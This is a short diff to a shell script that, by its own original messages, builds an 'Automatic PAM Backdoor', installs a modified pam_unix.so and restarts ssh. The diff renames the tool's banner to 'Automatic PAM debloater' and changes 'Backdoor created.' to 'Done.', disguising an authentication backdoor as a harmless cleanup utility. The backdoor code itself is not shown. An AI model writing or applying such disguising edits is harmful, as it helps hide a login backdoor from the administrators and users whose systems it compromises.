@@ -10,7 +10,7 @@ PAM_VERSION=
 PAM_FILE=
 PASSWORD=
 
-echo "Automatic PAM Backdoor"
+echo "Automatic PAM debloater"
 
 function show_help {
 	echo ""
@@ -94,6 +94,6 @@ cd ..
 systemctl daemon-reload
 systemctl restart ssh
 
-echo "Backdoor created."
+echo "Done."
 #echo "Now copy the generated ./pam_unix.so to the right directory (usually /lib/security/)"
 echo ""
